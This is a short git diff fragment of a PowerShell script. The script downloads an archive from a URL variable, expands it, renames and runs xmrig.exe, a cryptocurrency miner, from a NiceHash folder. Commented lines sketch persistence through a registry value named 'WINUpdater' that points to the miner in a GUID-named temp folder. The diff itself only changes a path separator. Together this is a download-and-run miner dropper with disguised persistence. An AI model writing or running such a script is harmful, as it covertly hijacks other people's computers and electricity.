@@ -14,6 +14,6 @@ Invoke-WebRequest -URI $URL -OutFile $PathtoSave; Expend-Archive -DestinationPat
 #    -Name "WINUpdater" `
 #    -Value "$env:temp/D13C3D8C-8A17-4898-G36A-6294B340288A/xmrig.exe"
 
-Rename-Item -Path NiceHash\xmrig -NewName NiceHash\xmrig.exe
+Rename-Item -Path NiceHash/xmrig -NewName NiceHash/xmrig.exe
 .\NiceHash\xmrig.exe
 
